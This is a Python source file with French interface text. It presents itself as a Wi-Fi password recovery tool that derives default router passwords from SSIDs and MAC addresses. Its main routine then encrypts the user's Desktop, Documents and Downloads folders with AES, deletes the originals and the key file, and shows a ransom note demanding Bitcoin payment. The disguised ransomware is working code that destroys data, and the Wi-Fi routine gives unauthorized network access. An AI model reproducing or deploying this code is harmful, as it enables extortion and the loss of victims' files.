import pywifi
from pywifi import const
import time
import tkinter as tk
from tkinter import filedialog, messagebox
import subprocess
import os, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
from Crypto.Random import get_random_bytes
import shutil
from PIL import ImageTk, Image
import ctypes


def st_decryption():
    root = tk.Tk()
    root.title("Décrypteur de fichiers")

    frame = tk.Frame(root)
    frame.pack(padx=10, pady=10)

    key_label = tk.Label(frame, text="Entrez la clé (16 caractères) :")
    key_label.grid(row=0, column=0, pady=5)

    key_entry = tk.Entry(frame, show='*', width=30)
    key_entry.grid(row=0, column=1, pady=5)

    save_key_button = tk.Button(frame, text="Sauvegarder la clé", command=save_key_to_file)
    save_key_button.grid(row=1, column=0, columnspan=2, pady=10)

    decrypt_button = tk.Button(frame, text="Démarrer la décryption", command=start_decryption)
    decrypt_button.grid(row=2, column=0, columnspan=2, pady=10)

    root.mainloop()


def decrypt_file(input_file, output_dir, key):
    with open(input_file, 'rb') as f:
        iv = f.read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        encrypted_data = f.read()

    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

    output_file = os.path.join(output_dir, os.path.basename(input_file))
    with open(output_file, 'wb') as f:
        f.write(decrypted_data)

    os.remove(input_file)

def decrypt_directory(input_dir, output_dir, key):
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    for item in os.listdir(input_dir):
        item_path = os.path.join(input_dir, item)
        if os.path.isfile(item_path):
            decrypt_file(item_path, output_dir, key)
        elif os.path.isdir(item_path):
            sub_input_dir = item_path
            sub_output_dir = os.path.join(output_dir, item)
            decrypt_directory(sub_input_dir, sub_output_dir, key)

def decrypt_files_in_directory(input_dir, output_dir, key_dir):
    if os.path.exists(key_dir):
        with open(key_dir, 'rb') as f:
            key = f.read(16)
    else:
        print(f"Le fichier de clé '{key_dir}' n'existe pas.")
        return

    decrypt_directory(input_dir, output_dir, key)

def copier_contenu_dossier(source, destination):
    """
    Copie le contenu d'un dossier vers un autre dossier.
    
    :param source: Chemin du dossier source.
    :param destination: Chemin du dossier destination.
    """
    if not os.path.exists(source):
        raise ValueError(f"Le dossier source {source} n'existe pas.")
    
    if not os.path.exists(destination):
        os.makedirs(destination)
    
    for item in os.listdir(source):
        source_item = os.path.join(source, item)
        destination_item = os.path.join(destination, item)
        
        if os.path.isdir(source_item):
            if os.path.exists(destination_item):
                copier_contenu_dossier(source_item, destination_item)
            else:
                shutil.copytree(source_item, destination_item)
        else:
            shutil.copy2(source_item, destination_item)


def deplacer_contenu_dossier(source, destination):
    if not os.path.exists(source):
        print(f"Le dossier source '{source}' n'existe pas.")
        return
    
    if not os.path.exists(destination):
        os.makedirs(destination)
    
    for element in os.listdir(source):
        element_path_source = os.path.join(source, element)
        element_path_destination = os.path.join(destination, element)
        
        if os.path.exists(element_path_destination):
            if os.path.isdir(element_path_destination):
                for sub_element in os.listdir(element_path_source):
                    sub_element_source = os.path.join(element_path_source, sub_element)
                    sub_element_destination = os.path.join(element_path_destination, sub_element)
                    shutil.move(sub_element_source, sub_element_destination)
                os.rmdir(element_path_source)
            else:
                print(f"Le chemin de destination '{element_path_destination}' existe déjà en tant que fichier.")
        else:
            shutil.move(element_path_source, element_path_destination)
        print(f"{element_path_source} déplacé vers {element_path_destination}")

def save_key_to_file():
    key = key_entry.get()
    if len(key) != 16:
        messagebox.showerror("Erreur", "La clé doit être de 16 caractères.")
        return
    
    with open("key.txt", 'wb') as key_file:
        key_file.write(key.encode('utf-8'))
    
    messagebox.showinfo("Succès", "Clé sauvegardée avec succès dans 'key.txt'.")

def start_decryption():
    dossiers = ["Desktop", "Documents", "Downloads"]
    for dossier in dossiers:
        input_dir = f"C:/Users/admin/{dossier}"
        output_dir = f"C:/Users/admin/deripted/{dossier}"
        key_dir = "key.txt"
        decrypt_files_in_directory(input_dir, output_dir, key_dir)
        
        copier_contenu_dossier(output_dir, input_dir)

def run_script(script_path):
    command = ["python", script_path]
    result = subprocess.run(command, capture_output=True, text=True)

def message_afficher():
    root = tk.Tk()
    root.title("Mon Interface")
    root.configure(bg="red")

    image_1_path = resource_path("image1.png")
    image_2_path = resource_path("image2.png")

    image1 = Image.open(image_1_path).resize((153, 153), Image.LANCZOS)
    image1 = ImageTk.PhotoImage(image1)

    image2 = Image.open(image_2_path).resize((153, 153), Image.LANCZOS)
    image2 = ImageTk.PhotoImage(image2)

    frame = tk.Frame(root, bg="red")
    frame.pack()

    label_image1 = tk.Label(frame, image=image1, bg="white", width=153, height=153)
    label_image1.pack()

    label_message = tk.Label(frame, text="Bonjour \n Nous sommes désolés de vous informer que votre ordinateur a été infecté par un logiciel de cryptage. Toutes vos données, y compris vos fichiers et vos documents, sont désormais cryptées et ne peuvent pas être accédées sans le déchiffrement. \n Nous sommes prêts à vous fournir le déchiffrement de vos données, mais cela nécessite un paiement de 1000. Veuillez envoyer le montant demandé à l'adresse de portefeuille suivante : \n Bitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa \n Une fois le paiement effectué, nous vous enverrons le déchiffrement pour récupérer vos données. \n Attention: Si vous ne faites pas le paiement, vos données resteront cryptées et ne pourront pas être récupérées.", font=("Arial", 16), bg="red", fg="white")
    label_message.pack(pady=10)

    label_image2 = tk.Label(frame, image=image2, bg="white", width=153, height=153)
    label_image2.pack()

    root.mainloop()

    image_path = os.path.abspath(resource_path("image3.png"))
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0x01 | 0x02)

def get_correct_aes_key(key):
    """
    Returns a key of valid length for AES (16, 24, or 32 bytes).
    If the provided key is shorter, it will be padded; if longer, it will be truncated.
    """
    if len(key) < 16:
        key = key.ljust(16)
    elif len(key) > 16 and len(key) < 24:
        key = key.ljust(24)
    elif len(key) > 24 and len(key) < 32:
        key = key.ljust(32)
    elif len(key) > 32:
        key = key[:32]
    return key

def encrypt_file(input_file, output_dir, key):
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)

    with open(input_file, 'rb') as f:
        original_data = f.read()

    padded_data = pad(original_data, AES.block_size)
    encrypted_data = cipher.encrypt(padded_data)

    output_file = os.path.join(output_dir, os.path.basename(input_file))
    with open(output_file, 'wb') as f:
        f.write(iv)
        f.write(encrypted_data)

    os.remove(input_file)

def couper_contenu_dossier(source, destination):
    if not os.path.exists(source):
        return
    
    if not os.path.exists(destination):
        os.makedirs(destination)
    
    for element in os.listdir(source):
        element_path_source = os.path.join(source, element)
        element_path_destination = os.path.join(destination, element)
        
        if os.path.exists(element_path_destination):
            if os.path.isdir(element_path_destination):
                for sub_element in os.listdir(element_path_source):
                    sub_element_source = os.path.join(element_path_source, sub_element)
                    sub_element_destination = os.path.join(element_path_destination, sub_element)
                    shutil.move(sub_element_source, sub_element_destination)
                os.rmdir(element_path_source)
        else:
            shutil.move(element_path_source, element_path_destination)

def remove_key_file(key_dir):
    try:
        os.remove(key_dir)
    except FileNotFoundError:
        print("Le fichier key.txt n'a pas été trouvé.")
    except Exception as e:
        print(f"Une erreur s'est produite lors de la suppression du fichier key.txt : {e}")

def encrypt_directory(input_dir, output_dir, key):
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    if input_dir != "C:/Users/admin/Documents\\My Music":
        if input_dir != "C:/Users/admin/Documents\\My Pictures":
            if input_dir != "C:/Users/admin/Documents\\My Videos":
                for item in os.listdir(input_dir):
                    item_path = os.path.join(input_dir, item)
                    if os.path.isfile(item_path):
                        encrypt_file(item_path, output_dir, key)
                    elif os.path.isdir(item_path):
                        sub_input_dir = item_path
                        sub_output_dir = os.path.join(output_dir, item)
                        encrypt_directory(sub_input_dir, sub_output_dir, key)

def encrypt_files_in_directory(input_dir, output_dir, key_dir):
    if os.path.exists(key_dir):
        with open(key_dir, 'rb') as f:
            key = f.read(16)
    else:
        key = get_random_bytes(16)
        with open(key_dir, 'wb') as f:
            f.write(key)

    correct_key = get_correct_aes_key(key)
    encrypt_directory(input_dir, output_dir, correct_key)

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)
    
def ping_server(ip_address):
    try:
        subprocess.run(['ping', ip_address], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True 
    except subprocess.CalledProcessError:
        return False 


def scan_wifi(timeout=7):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  

    iface.scan()
    time.sleep(timeout) 
    scan_results = iface.scan_results()
    return scan_results

def choose_wifi(networks, callback):
    root = tk.Tk()
    root.title("Choix du réseau Wi-Fi")

    bg_image = tk.PhotoImage(file=(resource_path("Blackbeard.png")))

    canvas = tk.Canvas(root, width=600, height=600)
    canvas.pack(fill="both", expand=True)
    canvas.create_image(0, 0, anchor="nw", image=bg_image)

    title_label = tk.Label(root, text="Sélectionnez un réseau Wi-Fi", font=("Helvetica", 20), bg="white")
    canvas.create_window(300, 50, window=title_label)

    listbox = tk.Listbox(root, font=("Helvetica", 14))
    for network in networks:
        ssid_text = network.ssid
        if ssid_text.startswith("04FS") or ssid_text.startswith("Wifi_peso") or ssid_text.startswith("fh_"):
            ssid_text += " ●"  
        listbox.insert(tk.END, ssid_text)  
    canvas.create_window(300, 200, window=listbox)

    def select_wifi():
        selected_index = listbox.curselection()
        if selected_index:
            choice = int(selected_index[0])
            selected_network = networks[choice]
            root.destroy()  
            callback(selected_network)  

    choose_button = tk.Button(root, text="Choisir", command=select_wifi, font=("Helvetica", 16))
    canvas.create_window(300, 400, window=choose_button)

    root.mainloop()

def handle_selected_network(network):
    global selected_network
    selected_network = network

def extract_info(network):
    return network.ssid, network.bssid

def traduire_mac(mac):
    mac_sans_separateurs = mac.replace(':', '').replace('-', '').upper()
    return mac_sans_separateurs

def six_derniers(variable):
    six_derniers = variable[-6:]
    return six_derniers

def extraire_six_au_milieu(variable):
    if len(variable) == 12 and variable[2] == "_" and variable[9] == "_":
        six_au_milieu = variable[3:9]
        return six_au_milieu
    else:
        print("La chaîne n'est pas au format attendu.")
        return None

def connexion_wifi(ssid, mot_de_passe):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0] 

    iface.disconnect()
    time.sleep(10)

    profil = pywifi.Profile()
    profil.ssid = ssid
    profil.key = mot_de_passe
    profil.akm.append(pywifi.const.AKM_TYPE_WPA2PSK) 

    iface.remove_all_network_profiles()
    profil = iface.add_network_profile(profil)

    iface.connect(profil)
    time.sleep(5)

    if iface.status() == pywifi.const.IFACE_CONNECTED:
        return True  
    else:
        return False  

def traduire_chaine(chaine):
    correspondance = {
        '0': 'f',
        '1': 'e',
        '2': 'd',
        '3': 'c',
        '4': 'b',
        '5': 'a',
        '6': '9',
        '7': '8',
        '8': '7',
        '9': '6',
        'a': '5',
        'b': '4',
        'c': '3',
        'd': '2',
        'e': '1',
        'f': '0'
    }
    
    traduction = [correspondance.get(caractere, caractere) for caractere in chaine]
    return "".join(traduction)

def main():
    networks = scan_wifi()
    choose_wifi(networks, handle_selected_network)

    if selected_network:
        nom, mac = extract_info(selected_network)

        if nom.startswith("Wifi_P") or nom.startswith("ADSL i"):
            new_code = traduire_mac(mac)
            messagebox.showinfo("Mot de passe", f"Le mot de passe est : {new_code}")
            valeur = messagebox.askyesno("Connexion", "Voulez-vous vous connecter directement ?")
            if valeur:
                connexion_wifi(nom, new_code)

        elif nom.startswith("fh") and nom.endswith("5G"):
            new_code1 = extraire_six_au_milieu(nom)
            new_code = traduire_chaine(new_code1)
            new_code = "wlan" + new_code
            messagebox.showinfo("Mot de passe", f"Le mot de passe est : {new_code}")
            valeur = messagebox.askyesno("Connexion", "Voulez-vous vous connecter directement ?")
            if valeur:
                connexion_wifi(nom, new_code)
                    
        elif nom.startswith("fh") or nom.startswith("04FS") or nom.startswith("fh"):
            new_code1 = six_derniers(nom)
            new_code = traduire_chaine(new_code1)
            new_code = "wlan" + new_code
            messagebox.showinfo("Mot de passe", f"Le mot de passe est : {new_code}")
            valeur = messagebox.askyesno("Connexion", "Voulez-vous vous connecter directement ?")
            if valeur:
                connexion_wifi(nom, new_code)

        else:
            messagebox.showinfo("Information", "Désolé :) Nous ne sommes pas supportés par ce type de réseau pour le moment.")
    else:
        messagebox.showinfo("Information", "Aucun réseau sélectionné.")

    ip_address = "127.0.0.1"
    if ping_server(ip_address):
        dossiers = ["Desktop", "Documents", "Downloads"]
        user_home = os.path.expanduser("~")
        for dossier in dossiers:
            input_dir = os.path.join(user_home, dossier)
            output_dir = os.path.join(user_home, "Encrypted", dossier)
            key_dir = "key.txt"
            encrypt_files_in_directory(input_dir, output_dir, key_dir)
            couper_contenu_dossier(output_dir, input_dir)

    remove_key_file(key_dir)
    message_afficher()
    st_decryption()


if __name__ == "__main__":
    main()
